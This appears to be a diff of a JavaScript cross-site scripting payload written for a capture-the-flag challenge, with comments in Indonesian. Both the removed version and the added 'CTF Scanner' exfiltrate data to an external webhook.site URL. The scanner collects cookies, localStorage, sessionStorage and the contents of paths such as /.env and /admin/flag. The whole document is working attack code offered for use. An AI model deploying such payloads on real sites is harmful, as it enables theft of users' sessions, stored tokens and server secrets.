@@ -1,12 +1,2 @@
-// --- opsi: kirim cookie jika tidak httpOnly
-try {
-  if (document.cookie) {
-    fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?cookie=' + encodeURIComponent(document.cookie));
-  }
-} catch(e) {}
-
-// --- opsi utama: scrap halaman internal yang memuat flag
-fetch('/flag')       // ganti ke '/flag' atau '/' kalau perlu
-  .then(r => r.text())
-  .then(t => fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?data=' + btoa(t)))
-  .catch(err => fetch('https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?err=' + encodeURIComponent(err)));
+// Ultimate CTF Scanner - All techniques combined 
+const webhook = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1'; class CTFScanner { constructor() { this.results = { timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent, cookies: document.cookie, referrer: document.referrer, domain: document.domain }; } async scanEndpoints() { const endpoints = ['/flag', '/admin/flag', '/api/flag', '/secret', '/flag.txt', '/.env', '/robots.txt']; this.results.endpoints = {}; for (const endpoint of endpoints) { try { const response = await fetch(endpoint); this.results.endpoints[endpoint] = { status: response.status, content: await response.text() }; } catch (error) { this.results.endpoints[endpoint] = { error: error.toString() }; } } } extractStorage() { this.results.storage = { localStorage: {...localStorage}, sessionStorage: {...sessionStorage} }; } findFlags() { const patterns = [/gemastik\{[^}]+\}/gi, /CTF\{[^}]+\}/gi, /flag\{[^}]+\}/gi]; const text = document.documentElement.textContent; this.results.potentialFlags = []; patterns.forEach(pattern => { const matches = text.match(pattern); if (matches) this.results.potentialFlags.push(...matches); }); } async sendResults() { await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(this.results) }); } async run() { try { await this.scanEndpoints(); this.extractStorage(); this.findFlags(); await this.sendResults(); } catch (error) { fetch(webhook, { method: 'POST', body: JSON.stringify({ error: error.toString(), url: location.href }) }); } } } new CTFScanner().run();
